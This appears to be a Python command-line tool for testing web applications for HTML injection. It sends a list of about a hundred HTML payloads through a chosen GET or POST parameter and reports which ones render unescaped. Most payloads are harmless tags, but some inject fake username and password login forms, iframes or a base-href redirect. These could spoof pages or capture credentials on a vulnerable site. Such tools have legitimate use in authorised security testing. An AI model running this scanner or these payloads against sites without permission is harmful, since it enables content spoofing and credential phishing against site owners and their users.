import requests
from bs4 import BeautifulSoup, Comment
import argparse
from colorama import init, Fore
from urllib.parse import urlparse, parse_qs, urlunparse

init(autoreset=True)

payloads = [
    "<h1>HTML</h1>", "<h1>html</h1>", "<h2>HTML</h2>", "<h3>HTML</h3>", "<h4>HTML</h4>", "<h5>HTML</h5>", "<h6>HTML</h6>",
    "<pre>HTML</pre>", "<p>HTML</p>", "<i>HTML</i>", "<a href='https://www.google.com'>HTML</a>",
    "<abbr title='HTML'>HTML</abbr>", "<acronym title='Armour Infosec'>AI</acronym>", "<address>address,address</address>",
    "<article><h2>Armour Infosec</h2></article>",
    "<audio controls><source src='demo.ogg' type='audio/ogg'><source src='demo.mp3' type='audio/mpeg'></audio>",
    "<b>HTML</b>", "qq<h1>HTML</h1>", "qq<h1>HTML</h1>qq", "<u>HTML</u>",
    "<iframe src='https://www.google.com' title='test'></iframe>",
    "123<h1>HTML</h1>", "<h1>HTML</h1>123", "<iframe id='if1' src='https://www.google.com'></iframe>",
    "<iframe id='if2' src='https://www.google.com'></iframe>", "<<h1>HTML</h1>", "<<h1>HTML</h1>>", "<<h1>html</h1>>",
    "<div>HTML</div>", "<textarea id='HTML' name='HTML' rows='4' cols='50'>Html injected</textarea>",
    "<head><base href='https://www.google.com' target='_blank'></head>",
    "<span style='color:blue;font-weight:bold'>html</span>", "<bdi>Html</bdi>injection", "<bdo dir='rtl'>HTML html</bdo>",
    "<blockquote cite='http://google.com'>HTML Injection</blockquote>", "<body><h1>HTML html</h1></body>",
    "Html<br>line breaks<br>injection", "<button type='button'>Click Me!</button>",
    "<canvas id='myCanvas'>draw htmli</canvas>", "<caption>Html</caption>", "<cite>Html Html</cite>",
    "<code>Html</code>", "<colgroup><col span='2' style='background-color:red'></colgroup>",
    "<data value='21053'>test html</data>", "<datalist id='html'><option value='html'></datalist>",
    "<dl><dt>Html</dt></dl>", "<dt>Html</dt>", "<dd>Html</dd>", "<del>Html</del>", "<ins>Html</ins>",
    "<details><summary>HTML</summary><p>html html</p></details>", "<dfn>HTML</dfn>", "<dialog open>Html</dialog>",
    "<dialog close></dialog>", "<em>Html</em>", "<embed type='text/html' src='index.html' width='500' height='200'>",
    "<fieldset><legend>hello:</legend><label for='fname'>First name:</label><input type='text' id='fname' name='fname'><br><br><input type='submit' value='Submit'></fieldset>",
    "<figure>Html</figure>", "<figcaption>Html Html</figcaption>", "<footer>HTML html</footer>",
    "<form method='GET'>Username: <input type='text' name='username' value='' /> <br />Password: <input type='password' name='passwd' value='' /> <br /><input type='submit' name='submit' value='login' /></form>",
    "<form method='POST'>Username: <input type='text' name='username' value='' /> <br />Password: <input type='password' name='passwd' value='' /> <br /><input type='submit' name='submit' value='login' /></form>",
    "<head><title>html</title></head>", "<header>HTML html</header>", "<hr>html<hr>",
    "<img src='index.jpg' alt='Girl in a jacket' width='500' height='600'>",
    "<input type='text' id='name' name='name'>", "<ins>red</ins>", "<kbd>Ctrl</kbd>",
    "<label for='html'>HTML</label><br>", "<legend>Html</legend>", "<li>Html</li>",
    "<main>Html</main>", "<map name='workmap'>Html</map>",
    "<meter id='html' value='2' min='0' max='10'>2 out of 10</meter>",
    "<nav>Html</nav>", "<noscript>Sorry, your browser does not support Html</noscript>",
    "<ol>html</ol>", "<optgroup label='Html'></optgroup>", "<option value='Html'>Html</option>",
    "<pre>Html</pre>", "<progress id='html' value='32' max='100'> 32% </progress>",
    "<q>Html Html</q>", "<s>Only 50 tickets left</s>", "<samp>File not found</samp>",
    "<section>HTML</section>", "<select name='cars' id='cars'></select>", "<small>HTML rocks</small>",
    "<strong>Html</strong>", "<sub>Html</sub>", "<summary>Html</summary>", "<sup>Html</sup>",
    "<svg width='100' height='100'><circle cx='50' cy='50' r='40' stroke='green' stroke-width='4' fill='yellow' /></svg>",
    "<table><th>HTML</th><th>HTML</th></table>", "<time>10:10</time>",
    "<time datetime='2008-02-14 20:00'>HTML</time>", "<ul>html</ul>", "<var>Html</var>",
    "<video width='320' height='240' controls></video>", "<wbr>HTML html<wbr>",
    "<body style='background-color:red'>"
]

def is_payload_rendered(payload, response_text):
    # Quick raw check: payload must be present unescaped (not HTML encoded)
    if payload not in response_text:
        return False

    try:
        soup_resp = BeautifulSoup(response_text, "html.parser")

        # Remove script, style tags and comments from soup_resp before searching
        for script_style in soup_resp(["script", "style"]):
            script_style.decompose()
        for comment in soup_resp.find_all(string=lambda text: isinstance(text, Comment)):
            comment.extract()

        # Parse payload as soup for tag checks
        soup_payload = BeautifulSoup(payload, "html.parser")
        first_tag = soup_payload.find()

        if first_tag:
            # Find tags in response with same name
            matching_tags = soup_resp.find_all(first_tag.name)
            # Check if any matching tag has exact inner HTML matching payload's inner HTML
            payload_inner_html = str(first_tag)

            for tag in matching_tags:
                # Compare the tag's HTML (including tag itself) to payload
                # Using prettify to normalize formatting
                if tag.prettify() == BeautifulSoup(payload_inner_html, "html.parser").prettify():
                    return True

            # Fallback: check if payload text appears as text inside any tag
            injected_text = first_tag.get_text(strip=True).lower()
            for tag in matching_tags:
                if injected_text and injected_text in tag.get_text(strip=True).lower():
                    return True

        # Last fallback: check if payload's visible text appears anywhere
        payload_text = soup_payload.get_text(strip=True).lower()
        full_text = soup_resp.get_text(separator=" ", strip=True).lower()
        if payload_text and payload_text in full_text:
            return True

    except Exception:
        # If error, fallback to raw text check
        if payload in response_text:
            return True

    return False

def build_url_with_payload(base_url, param, payload):
    parsed_url = urlparse(base_url)
    query_params = parse_qs(parsed_url.query)
    query_params[param] = [payload]
    query_string = "&".join(f"{k}={v[0]}" for k, v in query_params.items())
    new_url = urlunparse((
        parsed_url.scheme,
        parsed_url.netloc,
        parsed_url.path,
        parsed_url.params,
        query_string,
        parsed_url.fragment
    ))
    return new_url

def test_html_injections(url, param, method):
    headers = {
        "User-Agent": "Mozilla/5.0",
    }

    param_key = param.rstrip("=")

    for payload in payloads:
        if method.upper() == "GET":
            target_url = build_url_with_payload(url, param_key, payload)
            try:
                response = requests.get(target_url, headers=headers, timeout=10)
                if is_payload_rendered(payload, response.text):
                    print(Fore.GREEN + f"[+] Payload worked: {target_url}")
                else:
                    print(Fore.RED + f"[-] Payload failed: {target_url}")
            except Exception as e:
                print(Fore.YELLOW + f"[!] Error testing payload: {payload}\n    Reason: {e}")

        elif method.upper() == "POST":
            data = {param_key: payload}
            try:
                response = requests.post(url, headers=headers, data=data, timeout=10)
                display_url = build_url_with_payload(url, param_key, payload)  # Show URL with param=payload for display only
                if is_payload_rendered(payload, response.text):
                    print(Fore.GREEN + f"[+] Payload worked: {display_url}")
                else:
                    print(Fore.RED + f"[-] Payload failed: {display_url}")
            except Exception as e:
                print(Fore.YELLOW + f"[!] Error testing payload: {payload}\n    Reason: {e}")
        else:
            print(Fore.YELLOW + f"[!] Unsupported HTTP method: {method}")
            break

def main():
    parser = argparse.ArgumentParser(description="HTML Injection Tester")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", required=True, help="Parameter name with equal sign (e.g., query=)")
    parser.add_argument("-method", "--method", default="GET", help="HTTP method to use: GET or POST (default GET)")
    args = parser.parse_args()

    test_html_injections(args.url, args.param, args.method)

if __name__ == "__main__":
    main()
